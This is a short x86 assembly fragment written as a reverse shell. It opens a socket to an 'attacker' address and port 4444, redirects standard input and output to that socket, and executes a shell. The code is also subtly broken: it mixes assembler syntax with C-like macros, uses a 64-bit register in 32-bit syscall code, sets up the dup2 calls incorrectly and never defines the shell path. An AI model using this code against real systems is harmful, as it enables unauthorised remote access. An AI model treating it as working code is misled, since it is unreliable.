section .data
    sockfd dd 0
    sockaddr_in struct
        sin_family dw AF_INET
        sin_port   dw htons(4444) ; attacker listens on this port
        sin_addr   dd 0x0100007f ; attacker IP address (127.0.0.1)
    section .text
    global _start
    _start:
    ; create a socket
    mov eax, SYS_socket
    mov ebx, AF_INET
    mov ecx, SOCK_STREAM
    int 0x80
    mov dword [sockfd], eax
    ; connect to the attacker
    mov eax, SYS_connect
    mov ebx, dword [sockfd]
    mov ecx, sockaddr_in
    mov edx, sockaddr_in_len
    int 0x80
    ; duplicate stdin, stdout, stderr to the socket
    xor eax, eax
    mov al, 0x2 ; dup2 syscall
    mov ebx, dword [sockfd]
    mov ecx, eax ; fd = 0, stdin
    int 0x80
    mov ecx, eax ; fd = 1, stdout
    int 0x80
    mov ecx, eax ; fd = 2, stderr
    int 0x80
    ; execute a shell
    xor eax, eax
    mov al, 0xb ; execve syscall
    lea ebx, [rsp+12]
    xor ecx, ecx
    xor edx, edx
    int 0x80
